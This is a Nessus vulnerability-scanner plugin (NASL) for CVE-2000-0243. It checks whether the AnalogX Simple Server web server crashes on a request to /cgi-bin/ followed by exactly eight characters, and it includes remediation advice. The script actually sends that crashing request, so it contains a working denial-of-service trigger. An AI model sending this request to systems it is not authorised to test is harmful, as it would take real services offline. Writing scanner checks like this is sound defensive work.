#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10366);
 script_bugtraq_id(1076);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-2000-0243");
 name["english"] = "AnalogX denial of service";
 name["francais"] = "Déni de service AnalogX";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to crash the remote service by requesting
a URL with exactly 8 characters following the /cgi-bin/
directory. For example:

  http://www.YOURSERVER.com/cgi-bin/12345678

Solution : Upgrade to the latest version of your web server 
software, or consider an alternate web server such as 
Apache (http://www.apache.org).

Risk factor : High";


 desc["francais"] = "
 Il s'est avéré possible de faire planter le service distant
en faisant la requète d'une URL composée d'exactement 8 caractères
précédés de /cgi-bin.

Solution : mettez ce server a jour
Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crash the remote HTTP service";
 summary["francais"] = "plante le service distant";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000  Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");

 port = get_http_port(default:80);

 banner = get_http_banner(port:port);
 if ( "AnalogX Simple Server" >!< banner )exit(0);

 if (http_is_dead(port: port)) exit(0);

 if(get_port_state(port))
{
  soc = http_open_socket(port);
  if(soc)
  {
     req = http_get(item:"/cgi-bin/abcdefgh", port:port);
     send(socket:soc, data:req);
     http_close_socket(soc);
     sleep(5);
     if (http_is_dead(port: port)) security_hole(port);
  }
}
  
